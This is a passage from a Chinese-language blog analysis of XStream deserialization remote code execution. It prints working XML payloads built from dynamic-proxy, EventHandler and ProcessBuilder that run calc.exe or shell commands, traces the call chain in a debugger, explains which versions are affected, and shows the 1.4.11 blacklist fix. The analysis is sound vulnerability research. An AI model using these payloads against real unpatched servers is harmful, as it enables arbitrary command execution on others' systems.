class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行触发：</p><p><img src="/2019/10/21/XStream反序列化漏洞/2.png" alt=""></p><p>如果想加入多条命令，如创建目录等，可改为如下的payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// Windows</span><br><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>md<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>mi1k7ea<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Linux</span><br><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>"mkdir mi1k7ea"<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h5><p>下面我们在<code>xstream.fromXML()</code>语句中打上断点进行调试，同时在EventHandler类中的invoke()和invokeInternal()函数上也打上断点。</p><p>在AbstractTreeMarshallingStrategy.unmarshal()函数中，调用了TreeUnmarshaller.start()函数，即开始解析XML：</p><p><img src="/2019/10/21/XStream反序列化漏洞/12.png" alt=""></p><p>跟进start()函数，发现会调用HierarchicalStreams.readClassType()来获取到PoC XML中根标签的类类型java.util.SortedSet：</p><p><img src="/2019/10/21/XStream反序列化漏洞/4.png" alt=""></p><p>接着是调用convertAnother()函数对java.util.SortedSet类型进行转换，我们跟进去该函数，其中调用mapper.defaultImplementationOf()函数来寻找java.util.SortedSet类型的默认实现类型进行替换，这里转换为了java.util.TreeSet类型：</p><p><img src="/2019/10/21/XStream反序列化漏洞/5.png" alt=""></p><p>接着看到调用converterLookup.lookupConverterForType()来寻找TreeSet对应类型的转换器。我们跟进这个函数看看，其是变量所有转换器，通过调用Converter.canConvert()函数来判断该转换器是否能够转换出TreeSet类型，这里找到满足条件的TreeSetConverter转换器：</p><p><img src="/2019/10/21/XStream反序列化漏洞/6.png" alt=""></p><p>在XStream官网中可以查到类对应的Converter：<a href="http://x-stream.github.io/javadoc/com/thoughtworks/xstream/converters/collections/TreeMapConverter.html" target="_blank" rel="noopener">http://x-stream.github.io/javadoc/com/thoughtworks/xstream/converters/collections/TreeMapConverter.html</a></p><p>接着是调用<code>typeToConverterMap.put(type, converter);</code>将类型和转换器的对应关系放入Map表中，再返回转换器：</p><p><img src="/2019/10/21/XStream反序列化漏洞/9.png" alt=""></p><p>往下调试，在AbstractReferenceUnmarshaller.convert()函数中看到，会调用getCurrentReferenceKey()来获取当前的Reference键即标签名，接着将当前标签名压入parentStack栈中：</p><p><img src="/2019/10/21/XStream反序列化漏洞/10.png" alt=""></p><p>接着调用其父类即的FastStack.convert()方法，跟进去，显示将类型压入栈，然后调用转换器TreeSetConverter的unmarshal()方法：</p><p><img src="/2019/10/21/XStream反序列化漏洞/13.png" alt=""></p><p>往下调试，在TreeSetConverter.unmarshal()函数中调用了this.treeMapConverter.populateTreeMap()：</p><p><img src="/2019/10/21/XStream反序列化漏洞/7.png" alt=""></p><p>跟进该函数，先判断是否是第一个元素，是的话就调用putCurrentEntryIntoMap()函数，即将当前内容缓存到Map中：</p><p><img src="/2019/10/21/XStream反序列化漏洞/8.png" alt=""></p><p>跟进去，发现调用readItem()函数读取标签内的内容并缓存到target这个Map中：</p><p><img src="/2019/10/21/XStream反序列化漏洞/14.png" alt=""></p><p>返回到populateTreeMap()函数中，调用了<code>reader.moveUp();</code>即开始往下读其他元素，然后调用populateMap()函数：</p><p><img src="/2019/10/21/XStream反序列化漏洞/15.png" alt=""></p><p>跟进populateMap()，其中调用了populateCollection()函数，用来循环遍历子标签中的元素并添加到集合中，如图是将动态代理标签添加进集合中：</p><p><img src="/2019/10/21/XStream反序列化漏洞/18.png" alt=""></p><p>而调用的addCurrentElementToCollection()中，会调用readItem()读取标签内容，这里直接跳过具体的读取步骤，看到是成功获取到了该动态代理类并添加到了target这个Map缓存起来了：</p><p><img src="/2019/10/21/XStream反序列化漏洞/19.png" alt=""></p><p>继续跟进去几个函数，会发现调用DynamicProxyConverter.unmarshal()函数，这是由于PoC中含有dynamic-proxy标签会被程序识别并调用对应的DynamicProxyConverter转换器来实现将XML中该标签部分转换成动态代理类对象。而在该转换器的unmarshal()函数中，主要是扫描该标签的内容，然后调用Proxy.newProxyInstance()函数来生成新的动态代理类对象并返回（该动态代理类的target为EventHandler，action为start）：</p><p><img src="/2019/10/21/XStream反序列化漏洞/22.png" alt=""></p><p>在上图我们可以看到DynamicProxyConverter.unmarshal()函数中调用了convertAnother()函数来转换得到EventHandler，跟进该函数会发现是调用了ReflectionConverter转换器来进行EventHandler的解析的：</p><p><img src="/2019/10/21/XStream反序列化漏洞/24.png" alt=""></p><p>下面继续往下调试，回到populateMap()调用的地方。</p><p>调用完populateMap()之后，会判断JVM是否已充分将TreeMap都缓存起来了，然后调用TreeMap类对象resullt的putAll()方法，可看到参数中包含动态代理类，该代理类指向EventHandler类，而该类正如前面介绍时说的那样通过传入target和action参数值来利用反射机制调用了ProcessBuilder(cmd).start()来执行任意命令：</p><p><img src="/2019/10/21/XStream反序列化漏洞/16.png" alt=""></p><p>再跟进去调试，调试到TreeMap.put()函数中发现会调用到动态代理类对象$Proxy0的compareTo()方法来比较动态代理类对象和另一个字符串对象：</p><p><img src="/2019/10/21/XStream反序列化漏洞/17.png" alt=""></p><p><strong>由于我们PoC中interface标签写的是<code>java.lang.Comparable</code>接口，而该接口声明了一个compareTo()方法，因此当调用了动态代理类对象中的Comparable.compareTo()方法时就能成功动态调用PoC中构造的恶意动态代理类，从而通过反射机制达到任意代码执行。</strong></p><p>再往下，会调用到EventHandler.invoke()，其中会通过安全管理器获得权限来执行EventHandler.invokeInternal()函数，可以看到proxy参数是动态代理类对象、\9-]参数是compareTo方法、arguments参数是包含”foo”字符串的数组：</p><p><img src="/2019/10/21/XStream反序列化漏洞/20.png" alt=""></p><p>在EventHandler.invokeInternal()函数中，获取到目标动态代理类对象的实际方法后，就直接通过反射机制调用，从而导致弹计算器：</p><p><img src="/2019/10/21/XStream反序列化漏洞/21.png" alt=""></p><h5 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h5><p>我们在PoC中构造了一对sorted-set标签，其中包含实现了Comparable接口的dynamic-proxy标签，该代理标签中又包含一个指向EventHandler的handler标签，而Eventhandler中则包含了一个ProcessBuilder的target和值为’start’的action。</p><p>在XStream反序列化过程中，解析XML，将sorted-set标签识别出对应的TreeSetConverter转换器，再识别出sorted-set标签内有两个子元素，即string标签和dynamic-proxy标签；string标签会被识别出StringConverter转换器来解析出string标签内的字符串“foo”；dynamic-proxy标签会被识别出对应的DynamicProxyConverter转换器来解析出动态代理类对象；最后由于TreeSetConverter会对比两个子元素即调用$Proxy0.compareTo()来比较，而dynamic-proxy标签内实现了Comparable接口，因此由动态代理机制会触发dynamic-proxy标签内的handler标签指向的EventHandler类方法，从而利用反射机制实现任意代码执行。</p><p><strong>整个调试过程主要的函数调用链如下：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">XStream.fromXML</span><br><span class="line">XStream.unmarshal</span><br><span class="line">AbstractTreeMarshallingStrategy.unmarshal</span><br><span class="line">TreeUnmarshaller.start</span><br><span class="line">HierarchicalStreams.readClassType</span><br><span class="line">TreeUnmarshaller.convertAnother</span><br><span class="line">DefaultConverterLookup.lookupConverterForType</span><br><span class="line">...</span><br><span class="line">TreeSetConverter.unmarshal</span><br><span class="line">TreeSetConverter.populateTreeMap</span><br><span class="line">DynamicProxyConverter.unmarshal</span><br><span class="line">...</span><br><span class="line">ReflectionConverter.canConvert</span><br><span class="line">...</span><br><span class="line">TreeMap.putAll</span><br><span class="line">AbstractMap.putAll</span><br><span class="line">TreeMap.put</span><br><span class="line">$Proxy0.compareTo</span><br><span class="line">EventHandler.invoke</span><br><span class="line">EventHandler.invokeInternal</span><br><span class="line">MethodUtil.invoke</span><br></pre></td></tr></table></figure><h5 id="无法通杀-lt-1-3-1版本的原因"><a href="#无法通杀-lt-1-3-1版本的原因" class="headerlink" title="无法通杀&lt;=1.3.1版本的原因"></a>无法通杀&lt;=1.3.1版本的原因</h5><p>&lt;=1.3.1以下版本不能成功识别出根标签sorted-set的类，也就是说低版本并不支持sorted-set：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.thoughtworks.xstream.mapper.CannotResolveClassException: sorted-set : sorted-set</span><br></pre></td></tr></table></figure><h5 id="无法通杀1-4-1-4-5版本的原因"><a href="#无法通杀1-4-1-4-5版本的原因" class="headerlink" title="无法通杀1.4-1.4.5版本的原因"></a>无法通杀1.4-1.4.5版本的原因</h5><p>先看下TreeSetConverter.unmarshal()中的代码逻辑，当sortedMapField不为null时，treeMap才有可能不为null，treeMap不为null才能进入populateTreeMap()：</p><p><img src="/2019/10/21/XStream反序列化漏洞/25.png" alt=""></p><p>在1.4-1.4.4版本中，sortedMapField默认为null，因此无法成功利用：</p><p><img src="/2019/10/21/XStream反序列化漏洞/27.png" alt=""></p><p>而在&gt;=1.4.5版本中，sortedMapField默认不为null，因此能成功利用：</p><p><img src="/2019/10/21/XStream反序列化漏洞/26.png" alt=""></p><h5 id="无法通杀1-4-7-1-4-9版本的原因"><a href="#无法通杀1-4-7-1-4-9版本的原因" class="headerlink" title="无法通杀1.4.7-1.4.9版本的原因"></a>无法通杀1.4.7-1.4.9版本的原因</h5><p>在1.4.7版本的Change Log中有这么一句:</p><blockquote><p>java.bean.EventHandler no longer handled automatically because of severe security vulnerability.</p></blockquote><p>运行PoC会报以下错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: No converter specified for class java.beans.EventHandler</span><br><span class="line">---- Debugging information ----</span><br><span class="line">class               : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">required-type       : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">converter-type      : com.thoughtworks.xstream.converters.extended.DynamicProxyConverter</span><br><span class="line">path                : /sorted-set/dynamic-proxy/handler</span><br><span class="line">class[1]            : java.util.TreeSet</span><br><span class="line">converter-type[1]   : com.thoughtworks.xstream.converters.collections.TreeSetConverter</span><br><span class="line">version             : 1.4.7</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure><p>在ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤，导致不能成功利用：</p><p><img src="/2019/10/21/XStream反序列化漏洞/28.png" alt=""></p><h5 id="为何1-4-10能够成功"><a href="#为何1-4-10能够成功" class="headerlink" title="为何1.4.10能够成功"></a>为何1.4.10能够成功</h5><p>我们知道1.4.7-1.4.9版本中是因为在ReflectionConverter.canConvert()函数中添加了对EventHandler类的过滤导致不能成功利用。</p><p>但是我们在1.4.10中发现ReflectionConverter.canConvert()函数中把对EventHandler类的过滤又去掉了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">this</span>.type != <span class="keyword">null</span> &amp;&amp; <span class="keyword">this</span>.type == type || <span class="keyword">this</span>.type == <span class="keyword">null</span> &amp;&amp; type != <span class="keyword">null</span>) &amp;&amp; <span class="keyword">this</span>.canAccess(type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在利用的过程中虽然能够成功触发，但是控制台会输出提示未初始化XStream安全框架、会存在漏洞风险：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Security framework of XStream not initialized, XStream is probably vulnerable.</span><br></pre></td></tr></table></figure><h5 id="看看1-4-11如何修补的"><a href="#看看1-4-11如何修补的" class="headerlink" title="看看1.4.11如何修补的"></a>看看1.4.11如何修补的</h5><p>直接运行，先提醒未初始化安全框架，然后报错显示安全警告、拒绝反序列化目标类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Security framework of XStream not initialized, XStream is probably vulnerable.</span><br><span class="line">Exception in thread &quot;main&quot; com.thoughtworks.xstream.converters.ConversionException: Security alert. Unmarshalling rejected.</span><br><span class="line">---- Debugging information ----</span><br><span class="line">message             : Security alert. Unmarshalling rejected.</span><br><span class="line">class               : java.beans.EventHandler</span><br><span class="line">required-type       : java.beans.EventHandler</span><br><span class="line">converter-type      : com.thoughtworks.xstream.XStream$InternalBlackList</span><br><span class="line">path                : /tree-map/entry[2]/dynamic-proxy/handler</span><br><span class="line">class[1]            : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">required-type[1]    : com.thoughtworks.xstream.mapper.DynamicProxyMapper$DynamicProxy</span><br><span class="line">converter-type[1]   : com.thoughtworks.xstream.converters.extended.DynamicProxyConverter</span><br><span class="line">class[2]            : java.util.TreeMap</span><br><span class="line">required-type[2]    : java.util.TreeMap</span><br><span class="line">converter-type[2]   : com.thoughtworks.xstream.converters.collections.TreeMapConverter</span><br><span class="line">version             : 1.4.11</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure><p>可以看到，1.4.11以后的版本XStream新增了一个Converter类InternalBlackList，可以看到其实现的canConverter()方法中对EventHandler类、以”javax.crypto.”开头的类、以”$LazyIterator”结尾的类都进行了匹配，而其marshal()和unmarshal()方法都是直接抛出异常的，换句话说就是匹配成功的直接抛出异常即黑名单过滤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">InternalBlackList</span> <span class="keyword">implements</span> <span class="title">Converter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">InternalBlackList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canConvert</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> type == Void.TYPE || type == Void.class || !XStream.<span class="keyword">this</span>.securityInitialized &amp;&amp; type != <span class="keyword">null</span> &amp;&amp; (type.getName().equals(<span class="string">"java.beans.EventHandler"</span>) || type.getName().endsWith(<span class="string">"$LazyIterator"</span>) || type.getName().startsWith(<span class="string">"javax.crypto."</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">marshal</span><span class="params">(Object source, HierarchicalStreamWriter writer, MarshallingContext context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"Security alert. Marshalling rejected."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"Security alert. Unmarshalling rejected."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在XStream.setupConverters()函数中注册转换器时，InternalBlackList的优先级为PRIORITY_LOW高于ReflectionConverter的优先级PRIORITY_VERY_LOW，因此会优先判断：</p><p><img src="/2019/10/21/XStream反序列化漏洞/31.png" alt=""></p><p>因此，在后面的调试中会发现，当要寻找EventHandler类的转换器时，会返回InternalBlackList转换器：</p><p><img src="/2019/10/21/XStream反序列化漏洞/32.png" alt=""></p><p>当调用该InternalBlackList转换器的unmarshal()方法时，直接抛出异常：</p><p><img src="/2019/10/21/XStream反序列化漏洞/33.png" alt=""></p><h4 id="基于tree-map的PoC"><a href="#基于tree-map的PoC" class="headerlink" title="基于tree-map的PoC"></a>基于tree-map的PoC</h4><h5 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h5><p>通杀1.4.x系列有漏洞的版本，即&lt;=1.4.6或=1.4.10。</p><h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p>payload2.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>fookey<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foovalue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行触发：</p><p><img src="/2019/10/21/XStream反序列化漏洞/3.png" alt=""></p><p>可以看到，该payload涉及到的转换器是TreeMapConverter，至于其整个调用过程以及原理和前面sorted-set的差不多，只是转换器不一样了，这里就不再调试分析了。</p><h5 id="为何能通杀1-4-1-4-5版本"><a href="#为何能通杀1-4-1-4-5版本" class="headerlink" title="为何能通杀1.4-1.4.5版本"></a>为何能通杀1.4-1.4.5版本</h5><p>因为本次payload用的是TreeMapConverter转换器，和前面TreeSetConverter不一样，这里不存在类似sortedMapField是否为null的限制，因为两个转换器的代理逻辑完全不一样，调试一下就清楚了。</p><h5 id="无法通杀-lt-1-3-1版本的原因-1"><a href="#无法通杀-lt-1-3-1版本的原因-1" class="headerlink" title="无法通杀&lt;=1.3.1版本的原因"></a>无法通杀&lt;=1.3.1版本的原因</h5><p>运行PoC会报错显示TreeMap没有包含comparator元素，即不支持PoC中两个子标签元素调用compareTo()进行比较，因此无法利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.thoughtworks.xstream.converters.ConversionException: TreeMap does not contain &lt;comparator&gt; element</span><br></pre></td></tr></table></figure><p>在TreeMapConverter.unmarshal()中看到，判断子标签节点是否有comparator，若两个if判断条件都不满足则直接抛出异常，不会进入后面的populateMap()函数，因此也不会成功触发：</p><p><img src="/2019/10/21/XStream反序列化漏洞/E:/software/hexo/blog/source/_posts/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/29.png" alt=""></p><h5 id="无法通杀1-4-7-1-4-9版本的原因-1"><a href="#无法通杀1-4-7-1-4-9版本的原因-1" class="headerlink" title="无法通杀1.4.7-1.4.9版本的原因"></a>无法通杀1.4.7-1.4.9版本的原因</h5><p>和前面基于sorted-set的PoC的原因是一样的。</p><h4 id="基于接口的PoC"><a href="#基于接口的PoC" class="headerlink" title="基于接口的PoC"></a>基于接口的PoC</h4><h5 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h5><p>通杀1.4.x系列有漏洞的版本，即&lt;=1.4.6或=1.4.10。但是缺点是，我们必须得知道服务端反序列化得到的是啥接口类。</p><h5 id="接口特征"><a href="#接口特征" class="headerlink" title="接口特征"></a>接口特征</h5><p>一般的，基于接口类型的payload，是需要按照接口形式来编写的，即interface标签内容指向接口类。比如<a href="http://x-stream.github.io/CVE-2013-7285.html" target="_blank" rel="noopener">官网</a>给的例子，其中Contact是个接口类：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">contact</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>org.company.model.Contact<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">'java.beans.EventHandler'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">'java.lang.ProcessBuilder'</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc.exe<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">contact</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XStream xstream = <span 